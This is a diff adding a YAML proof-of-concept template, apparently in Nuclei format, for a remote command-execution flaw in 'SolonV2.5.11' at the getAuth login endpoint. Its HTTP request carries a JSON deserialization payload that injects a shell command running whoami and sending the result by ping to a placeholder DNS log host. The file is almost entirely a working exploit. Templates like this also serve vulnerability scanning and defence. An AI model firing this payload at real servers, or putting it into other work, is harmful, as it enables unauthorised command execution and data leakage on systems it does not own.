@@ -1,0 +1,19 @@
+id: poc-tnhaybr878hlpqxu
+info:
+  name: SolonV2.5.11 getAuth存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tnhaybr878hlpqxu'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tnhaybr878hlpqxu
+    fofa: 暂无
+http:
+- raw:
+  - "POST /adminPage/login/getAuth HTTP/1.1\nContent-Type: application/json\n\n{\n\"name\": {\n    \"@type\": \"sun.print.UnixPrintServiceLookup\",\n    \"lpcFirstCom\": [\n        \";ping -nc 2 `whoami`.${Dnslog}$;\",\n        \";ping -nc 2 `whoami`.${Dnslog}$;\"\n        ]\n    }\n}"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
